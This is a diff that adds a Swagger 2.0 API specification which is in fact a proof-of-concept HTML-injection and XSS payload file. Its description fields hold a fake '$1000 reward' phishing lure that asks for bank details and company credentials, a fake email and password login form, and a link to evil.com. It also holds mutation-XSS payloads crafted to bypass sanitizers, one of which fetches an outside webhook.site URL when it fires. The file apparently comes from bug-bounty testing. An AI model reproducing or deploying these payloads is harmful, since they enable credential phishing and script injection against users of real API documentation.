@@ -1,0 +1,62 @@
+swagger: '2.0'
+info:
+  title: HTML INJECTION FOR POC
+  description: |
+    <h1>By k4r4su. To get free 1000$ reward, please go to our partner website and fill up your bank account details needed to send the money or login below with your CIMPRESS CREDENTIALS:</h1> <h1><a href="https://evil.com" onclick="alert('XSS by OneGuard')">Click Here</a></h1>
+    <form><label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br><label><input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br><input type="submit" value="SIGN IN" onclick="msg()"></form>
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='fetch('https://webhook.site/ece8cc44-cb2f-4e31-a956-f698c0c156a6/?t=tothemoon_swagger', {method: 'GET'});'>">
+    <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=print()&gt;">
+
+  version: "1.0"
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  "/d23":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - somettext
+      operationId: findAccounts
+      summary: this is example text
+  "/malformed_by_d23":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<h1>hide here</h1>"></form>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: d23
+      summary: d23
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: some_operation
+      summary: this is example text
